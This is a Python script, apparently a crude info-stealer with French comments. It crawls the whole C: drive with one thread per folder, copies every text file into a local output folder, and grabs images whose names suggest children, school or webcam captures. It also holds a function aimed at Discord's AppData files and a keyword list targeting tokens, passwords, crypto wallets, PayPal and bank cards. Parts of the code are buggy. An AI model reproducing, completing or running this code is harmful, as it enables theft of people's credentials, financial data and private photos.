
import os 
from os import getenv
import shutil
import sys
import threading
from time import time
from PIL import Image
import time
def discord():
    appdata = getenv(r'APPDATA')

    path = {

    }
    #caracter qui relie
    for fic in path:
        c = "\\"
        #enumere les fichier dans le path de discord
        doc = os.listdir(path['discord'])
        f = 0
        turn = 0
        for files in doc:
            f = f + 1
            turn = turn + 1
            file = doc[turn]
            level = path['discord'] + c + doc[turn]
            print(level)
            try:
                shutil.copyfile(level, f'{file}.txt')
            except:
                print("acces")

img_path_list_buffer = []
#blacklist_path_img = ["c:/system32",
    #"C:\Program Files (x86)",
    #"C:\Program Files",
    
_img_word = [
    "montagne",
    "ecole",
    "school",
    "2020",
    "2021",
    "enfant",
    "vacances",
    "child",
    "souvenir",
    "ete",
    'img',
    'webcam',
    "unknown",
    "capture",
    
    ]
_txt_word = ['token',
    'adresse',
    'wallet',
    'ttk',
    'password',
    'mot de passe',
    'adresse',
    'mdp',
    'paypal',
    'binance',
    'metamask wallet',
    'metamask',
    'exodus',
    'discord',
    'info',
    'carte',
    'carte bancaire',
    'cc',
    'banque',
    'important word',
    'enfant',
    'level',
    'MANIFEST',
    'doc',
    'crypto'
    ]

#txt_word = []
#for word in _txt_word:
    #txt_word.append(word + " ")
    #txt_word.append(word + "-")
    #txt_word.append(word + "_")
img_word = []
for word in _img_word:
    img_word.append(word + " ")
    img_word.append(word + "-")
    img_word.append(word + "_")
turn = 0
rec = 0
rec_max = 70 
find = 0
def get_script_path():
    path= os.path.dirname(os.path.realpath(sys.argv[0]))
    return path
def list_dir_txt(path):
    global img_path_list_buffer
    global find
    global turn
    global rec
    rec += 1
    try:
        for file in os.listdir(path):
            
            if not os.path.isfile(path + "/" + file):
                threading.Thread(target = list_dir_txt,args=(path + "/" + file,)).start()
            else:
                if file.split(".")[-1] == "txt":
                    print(f"--- {path}/{file} --------------------------------------------------------------")
                    #for w in txt_word:
                        #if w in file:
                    find = find + 1
                    name = f"{path}/{file}"
                    content = open(f"{path}/{file}", "r").read()
                    with open(f"{get_script_path()}/output/txt/{file}",'w') as file:
                        file.write(content)          
                else: 
                    turn = turn + 1
                    pass
                if file.split(".")[-1] == "jpg" or 'png':
                    print(f"--- {path}/{file} --------------------------------------------------------------")
                    for w in img_word:
                        if w in file:
                            find = find + 1
                            path_image = path + '/' + file
                            Image1 = Image.open(path_image)
                            Image1copy = Image1.copy()
                            Image1copy.save(f"{get_script_path()}/output/img/grab-{file}")
                            img_path_list_buffer.append(path + '/' + file)
                            if len(img_path_list_buffer) >= 20:
                                with open('./output/img_pathlist.txt','a')as file:
                                    file.write("\n".join(img_path_list_buffer) + '\n')
                                img_path_list_buffer = []  
                else:
                    turn = turn + 1
                    print(f"file vaccum {turn}")
                    pass
    except Exception as e:
        pass
    rec -= 1

list_dir_txt('c:/')
print(f"Total vaccum file {turn} | Total take file {find}")
with open('./output/img_pathlist.txt','a')as file:
    file.write("\n".join(img_path_list_buffer) + '\n')